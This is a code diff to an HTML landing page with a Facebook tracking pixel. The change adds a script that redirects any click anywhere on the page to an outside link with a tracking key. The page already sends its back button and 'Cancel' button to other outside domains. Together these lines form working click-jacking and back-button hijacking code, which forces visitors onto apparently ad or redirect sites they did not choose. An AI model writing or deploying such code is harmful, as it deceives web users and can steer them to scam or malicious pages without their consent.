@@ -45,6 +45,7 @@ src="https://www.facebook.com/tr?id=1207658523790750&ev=PageView&noscript=1"
       display: flex;
       align-items: center;
       justify-content: center;
+      cursor: pointer; /* Change cursor to indicate interactivity */
     }
 
     /* Dialog box styling */
@@ -105,6 +106,11 @@ src="https://www.facebook.com/tr?id=1207658523790750&ev=PageView&noscript=1"
     }
   </style>
   <script>
+    function redirectToLink() {
+      // Replace this URL with the link you want to load
+      window.location.href = 'https://impulseaversion.com/p1zzdw3f9?key=dc98018eb574131d1f9c5fc1117f3b68';
+    }
+
     function loadCancelLink() {
       window.location.href = 'https://bettingmet.com/cc9cgux1?key=633de996826c7129f36280e0e4e16cf7'; // Replace with your Cancel link
     }
@@ -121,6 +127,11 @@ src="https://www.facebook.com/tr?id=1207658523790750&ev=PageView&noscript=1"
         // Redirect to an alternate link when going back from the Continue page
         window.location.href = 'https://impulseaversion.com/p1zzdw3f9?key=dc98018eb574131d1f9c5fc1117f3b68'; // Replace with your alternate back link
       }
+    });
+
+    // Attach click event to the body to redirect
+    document.addEventListener('DOMContentLoaded', function () {
+      document.body.addEventListener('click', redirectToLink);
     });
   </script>
 </head>
